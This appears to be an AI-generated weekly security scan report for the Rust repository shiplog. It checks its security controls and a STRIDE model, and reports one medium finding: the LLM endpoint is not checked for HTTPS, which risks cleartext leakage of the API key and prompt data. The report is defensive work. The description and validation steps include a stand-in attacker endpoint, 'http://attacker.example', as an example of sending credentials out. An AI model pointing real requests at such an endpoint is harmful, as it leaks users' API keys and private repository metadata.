# Security Scan Report

**Generated:** 2026-06-29
**Scan Type:** Weekly Scheduled
**Repository:** EffortlessMetrics/shiplog
**Severity Threshold:** medium

## Executive Summary

| Severity | Count | Auto-fixed | Manual Required |
|----------|-------|------------|-----------------|
| CRITICAL | 0 | 0 | 0 |
| HIGH | 0 | 0 | 0 |
| MEDIUM | 1 | 0 | 1 |
| LOW | 0 | 0 | 0 |

**Total Findings:** 1
**Auto-fixed:** 0
**Manual Review Required:** 1

## Scan Results Overview

This weekly scan reviewed the shiplog repository across all Rust source files in `apps/shiplog/src/`, `crates/`, and `xtask/`, GitHub Actions workflows under `.github/workflows/`, policy files under `policy/`, and supporting infrastructure introduced or modified since the previous scan (2026-05-18).

The repository's most recent commit (`383ab5f` on 2026-06-16) landed the swarm promotion merge; that merge brought 800 files into the tree, but the underlying code changes had already been reviewed on `EffortlessMetrics/shiplog-swarm` prior to merge. No commits landed within the strict 7-day scan window (last commit is 13 days old), so the scan operated on the full security-sensitive surface area at HEAD to look for any regressions.

### Security Controls Verified

| Control | Status | Notes |
|---------|--------|-------|
| Secrets Management | PASS | No hardcoded secrets in source. Secrets flow through `GITHUB_TOKEN`, `GITLAB_TOKEN`, `JIRA_TOKEN`, `LINEAR_API_KEY`, `SHIPLOG_LLM_API_KEY`, `SHIPLOG_REDACT_KEY`, `MINIMAX_API_KEY`, `FACTORY_API_KEY`, `CODECOV_TOKEN`, `CARGO_REGISTRY_TOKEN` (all via `std::env::var` or `${{ secrets.* }}` in workflows) |
| SQL Injection | PASS | All SQLite access uses parameterized queries via `rusqlite::params!` macro in `apps/shiplog/src/cache/sqlite.rs`; no string concatenation or `format!` into SQL statements |
| Command Injection | PASS | `try_open_path` (main.rs) calls `xdg-open`/`open`/`explorer.exe` with `Command::arg(path)` (safe argv escaping); integration tests use `Command::new(env!("CARGO_BIN_EXE_shiplog"))` (hardcoded binary path) |
| Unsafe Code | PASS | No `unsafe` blocks anywhere in `apps/` or `crates/` (verified via ripgrep across changed files) |
| Input Validation | PASS | YAML/JSONL ingestion parses with `serde_yaml`/`serde_json` typed deserializers; unknown fields are silently dropped rather than acted on; manual events parser produces typed `EventEnvelope` records |
| Path Traversal | PASS | Output paths derive from user-supplied `--out` root joined with stable filenames (`packet.md`, `ledger.events.jsonl`, etc.); no user-controlled paths flow into zip archive entry names beyond the run-directory scope |
| Redaction Containment | PASS | `redaction.aliases.json` (plaintext-to-alias map that would defeat redaction) is hard-excluded from bundle walks for all three profiles (`apps/shiplog/src/bundle/mod.rs` `ALWAYS_EXCLUDED`); verified by `walk_files_excludes_redaction_aliases`, `bundle_manifest_excludes_redaction_aliases`, `zip_excludes_redaction_aliases`, `all_profiles_exclude_aliases` tests |
| HTTPS for External APIs | PARTIAL | GitHub/GitLab/Jira/Linear/Manual adapters use HTTPS only. `OpenAiCompatibleBackend` accepts an arbitrary `endpoint` URL with no scheme validation (see VULN-001) |
| Token Bearer Auth | PASS | GitHub API client (`apps/shiplog/src/ingest/github.rs`) uses `reqwest::blocking::Client::bearer_auth(token)`; rate-limit response handling strips headers via `header_str` filter |
| GitHub Actions Pinning | PASS | All `actions/checkout`, `dtolnay/rust-toolchain`, `taiki-e/install-action`, `Swatinem/rust-cache`, `actions/upload-artifact`, and `EffortlessMetrics/droid-action-safe` invocations are pinned by SHA (`@v6.0.3`, `@7c1377ccbacddc95560d1570547a5baa51de01ec`, etc.) |
| Workflow Least Privilege | PASS | Every workflow declares a top-level `permissions:` block with the minimum scopes required (e.g. `ripr.yml` is `contents: read`, `droid-review.yml` requests only `contents: write`, `pull-requests: write`, `issues: write`, `id-token: write`, `actions: read`) |
| Trust Actor Gating | PASS | Manual `@droid` invocations (`droid.yml`) gate on `comment.author_association in {OWNER, MEMBER, COLLABORATOR}` before triggering the AI step |
| Network Allowlist | PASS | `policy/network-allowlist.toml` receipts every outbound destination (crates.io, api.github.com, codecov.io, api.minimax.io, factory.ai, dashboard.gitguardian.com, etc.) with auth requirements and lane ownership |
| Publish Allowlist | PASS | `policy/publish-allowlist.toml` constrains `cargo publish` to the supported surface (`shiplog`); `shiplog-testkit` and `xtask` are explicitly marked `publish = false` |
| Fuzzing | ACTIVE | Fuzz harnesses in `fuzz/fuzz_targets/` (cache, parse_jsonl, parse_config, parse_github_api, parse_manual_events, redact_event, receipt_markdown, render_md_packet, schema_event_deser, workstream_cluster, etc.) |
| Property Testing | ACTIVE | `proptest` property tests in `redact/mod.rs`, `cache/sqlite.rs`, `ingest/manual/events.rs`, `cluster_llm/parse.rs` covering redaction leak detection, cache TTL semantics, and manual event window boundaries |
| Mutation Testing | ACTIVE | `cargo-mutants.toml` present; `redact/policy.rs`, `ingest/manual/events.rs`, and `cache/sqlite.rs` use `#[mutants::skip]` annotations only where mutation would be a false-positive runtime issue (HTTP calls, env-var reads) |
| Snapshots | ACTIVE | `insta` snapshot tests in `render/md/mod.rs` for packet rendering and in CLI integration tests |

### STRIDE Threat Model Assessment

| STRIDE Category | Assessment | Notes |
|-----------------|------------|-------|
| Spoofing | LOW RISK | Tokens are environment-sourced; HMAC-SHA256 aliasing in `redact/alias.rs` provides deterministic pseudonymization for user identities |
| Tampering | LOW RISK | Immutable event ledger (`ledger.events.jsonl`); SHA-256 `EventId` derivation; content-addressed SQLite cache with TTL; `redaction.aliases.json` excluded from share bundles |
| Repudiation | LOW RISK | Receipts-first design: each event includes a `SourceRef { system, url, opaque_id }`; coverage manifest records slices and `incomplete_results` flags |
| Information Disclosure | MEDIUM RISK | One MEDIUM finding (VULN-001): `OpenAiCompatibleBackend` does not validate that the configured endpoint uses `https://`. The default endpoint is HTTPS, but a misconfigured or attacker-supplied `--llm-api-endpoint http://...` would transmit the LLM API key and event summaries in cleartext |
| Denial of Service | LOW RISK | TTL-based cache expiry, `GithubApiBudget` guardrails (`max_search_requests`, `max_core_requests`), bounded loop counts (`max_pages = 10`), LLM request timeout (`timeout_secs: u64`), no recursion in cache/parsing paths |
| Elevation of Privilege | LOW RISK | No `unsafe` blocks, no shell metacharacter handling, fixed-binary `Command::new` calls in `try_open_path`, `cargo-allow` source-restricted policy, all GitHub Actions pinned to specific SHA commits |

### Files Examined

The scan inspected the security-sensitive surface introduced by `383ab5f` and the underlying swarm promotion:

- `apps/shiplog/src/redact/{mod,alias,policy,profile,projector,repo}.rs` - redaction engine
- `apps/shiplog/src/cache/{mod,sqlite,key,expiry,stats}.rs` - SQLite cache layer
- `apps/shiplog/src/ingest/{github,gitlab,jira,linear,json,git,manual/*}.rs` - source adapters
- `apps/shiplog/src/cluster_llm/{client,config,mod,parse,parse/*,prompt}.rs` - LLM clustering backend
- `apps/shiplog/src/commands/{mod,collect,refresh,run,import,merge}.rs` and `main.rs` - CLI dispatch
- `apps/shiplog/src/render/md/{mod,coverage,receipt,source}.rs` - Markdown renderer
- `apps/shiplog/src/bundle/{mod,layout}.rs` - bundle/zip writer
- `apps/shiplog/src/merge/mod.rs`, `apps/shiplog/src/workstreams/{mod,cluster,layout,receipt_policy}.rs`
- `.github/workflows/*.yml` - CI/CD workflow definitions
- `policy/{network-allowlist,publish-allowlist,executable-allowlist,workflow-allowlist}.toml`
- `Cargo.toml`, `apps/shiplog/Cargo.toml`, `deny.toml`, `rust-toolchain.toml`

## Critical Findings

None.

## High Findings

None.

## Medium Findings

### VULN-001: LLM endpoint URL accepts non-HTTPS schemes, risking cleartext API key and prompt leakage

| Attribute | Value |
|-----------|-------|
| **Severity** | MEDIUM |
| **STRIDE Category** | Information Disclosure |
| **CWE** | CWE-319 (Cleartext Transmission of Sensitive Information) |
| **File** | apps/shiplog/src/cluster_llm/client.rs:23-25 (struct field), apps/shiplog/src/cluster_llm/client.rs:29-58 (`complete` impl), apps/shiplog/src/main.rs:11706-11720 (`build_clusterer`) |
| **Status** | Manual fix required |

**Description:**

`OpenAiCompatibleBackend` accepts the LLM API endpoint as a free-form `String` and passes it directly to `reqwest::blocking::Client::post(&self.endpoint)` without validating that the URL uses `https://`. The default endpoint (`https://api.openai.com/v1/chat/completions`) and the CLI default `--llm-api-endpoint` are HTTPS, but a user (or an attacker who controls a curated workstream config / docs / share packet that names a non-HTTPS endpoint) can override the endpoint with `--llm-api-endpoint http://attacker.example/...`. When this happens:

1. The Authorization header (`Bearer <api_key>`) is sent in cleartext, leaking the LLM API key.
2. The request body, which contains event summaries including PR titles and repo names, is also sent in cleartext, leaking potentially sensitive project metadata.

The LLM clustering feature is opt-in (`--llm-cluster`, default off) and gated behind the `llm` feature flag, which limits the affected population. However, because the prompt itself sends PR titles and repo names, the disclosure surface includes private repository metadata when the user has GitHub private repos in their activity.

**Evidence:**

```rust
// apps/shiplog/src/cluster_llm/client.rs:21-25
pub struct OpenAiCompatibleBackend {
    pub endpoint: String,        // no scheme validation
    pub api_key: String,
    pub model: String,
    pub temperature: f64,
    pub timeout_secs: u64,
}

// apps/shiplog/src/cluster_llm/client.rs:29-58
fn complete(&self, system: &str, user: &str) -> Result<String> {
    let client = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(self.timeout_secs))
        .build()?;

    let body = serde_json::json!({
        "model": self.model,
        ...
    });

    let resp = client
        .post(&self.endpoint)   // sends to whatever scheme the user provided
        .header("Authorization", format!("Bearer {}", self.api_key))
        ...
        .send()
        .context("LLM API request failed")?;
    ...
}
```

```rust
// apps/shiplog/src/main.rs:483 (CLI arg, no URL validation)
#[arg(long, default_value = "https://api.openai.com/v1/chat/completions")]
llm_api_endpoint: String,
```

```rust
// apps/shiplog/src/main.rs:11706-11720 - wiring
let backend = shiplog::cluster_llm::OpenAiCompatibleBackend {
    endpoint: llm_api_endpoint.to_string(),  // passed through unchanged
    api_key,
    ...
};
```

**Reachability:** Reachable only when the user opts into `--llm-cluster` AND builds with `--features llm` AND supplies a non-HTTPS endpoint. Default configuration is safe.

**Exploitability:** Trivial to trigger from the command line (`--llm-api-endpoint http://...`), but requires the operator to opt in to LLM clustering and either misconfigure or be misled into a non-HTTPS URL.

**Impact:** Disclosure of (a) the user's LLM provider API key and (b) PR titles and repo names from the harvested events. PR titles for private repositories are themselves sensitive metadata.

**Recommended Fix:**

In `OpenAiCompatibleBackend::complete` (or in the `build_clusterer` site in `main.rs`), reject any endpoint URL whose scheme is not `https` before sending the request. A minimal version:

```rust
fn complete(&self, system: &str, user: &str) -> Result<String> {
    let endpoint_url = url::Url::parse(&self.endpoint)
        .context("parse LLM endpoint URL")?;
    if endpoint_url.scheme() != "https" {
        anyhow::bail!(
            "LLM endpoint must use https:// (got scheme {:?}); refusing to send API key over cleartext",
            endpoint_url.scheme()
        );
    }
    // ...existing code, using endpoint_url instead of &self.endpoint...
}
```

Alternative: validate at `build_clusterer` time and exit with a clear error before any request is issued. The `url` crate is already a workspace dependency, so no new transitive cost.

Additionally consider extending `policy/network-allowlist.toml` with an explicit allow entry for the LLM endpoint and noting in CLI help that `--llm-api-endpoint` must use `https://`.

**Validation:**

After the fix:
- Running `--llm-cluster --llm-api-endpoint http://attacker.example/v1/chat/completions` should fail with a clear error before any HTTP request is issued.
- The default OpenAI endpoint and any user-supplied `https://...` endpoint should continue to work unchanged.
- New unit tests should cover: reject `http://`, reject `ftp://`, accept `https://`, accept trailing-slash variants.

**Confidence:** Medium-High. The finding is straightforward to confirm by reading the code; the only nuance is the opt-in gating.

## Low Findings

None at or above the medium severity threshold.

## Appendix

### Threat Model
- Version: 2026-05-11 (unchanged this scan; still within 90-day freshness window)
- Location: `.factory/threat-model.md`
- Note: Existing threat model adequately covers the LLM endpoint risk as part of the Information Disclosure category (Severity: High). The current finding (VULN-001) is a concrete code-path instance of that documented threat.

### Scan Metadata
- Commits Scanned in Strict 7-Day Window: 0 (most recent commit `383ab5f` on 2026-06-16 is 13 days old)
- Commits Scanned Since Prior Scan (2026-05-18): 1 (`383ab5f` - merge commit, 800 files, 206,156 insertions)
- Files Examined: 90+ Rust source files (security-sensitive paths in `apps/shiplog/src/{redact,cache,ingest,cluster_llm,commands,render,bundle,workstreams,merge}`), 14 GitHub Actions workflows, 6 policy files
- Scan Duration: ~10 minutes
- Tools Used: ripgrep (pattern search), file_read (manual review), cargo manifest inspection
- Skills Used: threat-model-generation (existing model reused), commit-security-scan (manual STRIDE walk), vulnerability-validation (reachability/impact assessment)

### Recommendations

1. **Address VULN-001** - Add an HTTPS scheme check in `OpenAiCompatibleBackend::complete` (or `build_clusterer`) before sending the request. This is the only finding at or above the medium threshold.
2. **Continue weekly cadence** - The repository is healthy and the prior scans (2026-05-11, 2026-05-18) both reported zero findings. Maintain the weekly cadence to catch regressions early.
3. **Monitor `--llm-cluster` ergonomics** - As the LLM clustering feature matures (more endpoints, more providers), consider codifying the allowlist in `policy/network-allowlist.toml` and gating via a typed enum.
4. **Keep `redaction.aliases.json` exclusion strong** - The current `ALWAYS_EXCLUDED` list in `bundle/mod.rs` is a critical defense for the redaction story. Add a regression test that fails if any new file matches that name pattern.
5. **Document secrets policy in CLI help** - Consider adding a brief note in `--help` output reminding operators to prefer `SHIPLOG_LLM_API_KEY` and `SHIPLOG_REDACT_KEY` env vars over CLI flags, since CLI args are visible in `ps` listings (a long-known but low-severity concern that is below this scan's threshold).

### References

- [CWE-319: Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)
- [STRIDE Threat Model](https://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats)
- [OWASP API Security Top 10 - API3:2023 Broken Object Property Level Authorization (related: avoid leaking internal data to third-party LLM endpoints)](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)

---

*Report generated by Factory Droid (security-engineer plugin)*